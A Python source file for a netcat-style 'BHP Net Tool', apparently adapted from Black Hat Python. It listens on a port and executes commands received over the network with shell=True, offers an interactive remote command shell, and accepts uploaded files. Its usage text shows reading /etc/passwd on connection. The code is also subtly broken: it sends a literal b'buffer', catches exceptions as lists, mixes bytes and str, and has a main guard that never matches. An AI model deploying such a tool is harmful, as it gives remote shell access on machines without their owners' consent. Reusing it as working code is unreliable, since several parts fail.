import getopt
import socket
import subprocess
import sys
import threading


# define some global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_dest = ""
port = 0


def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen              - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run - execute the given file upon receiving a connection")
    print("-c --command             - initialize a command shell")
    print("-u --upload-destination  - upon receiving a connection upload a file and write to [destination]")
    print("\n\n")
    print("Examples:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u C:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect to our target host
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)

        while True:
            # now wait for the data back
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            print("Message received: {}".format(response))

            # wait for more input
            buffer = input("")
            buffer += "\n"

            # send it off
            client.send(b'buffer')
    except [socket.error, socket.timeout]:

        print("[*] Exception! Exiting now")

        # tear down the connection
        client.close()


def client_handler(client):
    global upload, execute, command

    # check for upload
    if len(upload_dest):

        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available
        while True:
            data = client.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        try:
            fd = open(upload_dest, "wb")
            fd.write(file_buffer)
            fd.close()

            response = "Successfully saved file to {}\r\n".format(upload_dest)
            # acknowledge that we wrote the file out
            client.send(response)
        except [socket.error, socket.timeout]:
            response = "Failed to save file to {}".format(upload_dest)
            client.send(response)

    # check for command execution
    if len(execute):
        # run the command
        output = run_command(execute)

        client.send(output)

    # now we go into another loop if a command shell was requested
    if command:

        while True:
            # show a simple prompt
            client.send("<BHP:#> ")
            # now we receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client.recv(1024)

            # run the command and store the output
            response = run_command(cmd_buffer)

            # send the output back
            client.send(response)


def server_loop():
    global target

    # if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(command):

    # trim the newline
    cmd = command.rstrip()

    # run the command and get the output back
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except [subprocess.SubprocessError, subprocess.TimeoutExpired, subprocess.CalledProcessError] as e:
        output = e

    # send output back to client
    return output


def main():
    global listen, port, execute, command, upload_dest, target

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:", ["help", "listen", "execute", "target", "port",
                                                                "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_dest = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

        # are we going to listen or just send data from stdin?
        if not listen and len(target) and port > 0:
            # read in the buffer from the commandline
            # this will block, so send CTRL-D if not sending input
            # to stdin
            buffer = sys.stdin.read()

            # send data off
            client_sender(buffer)

        # we are going to listen and potentially
        # upload things, execute commands, and drop a shell back
        # depending on our command line options above
        if listen:
            server_loop()


if __name__ == "__main__.py":
    exit(main())
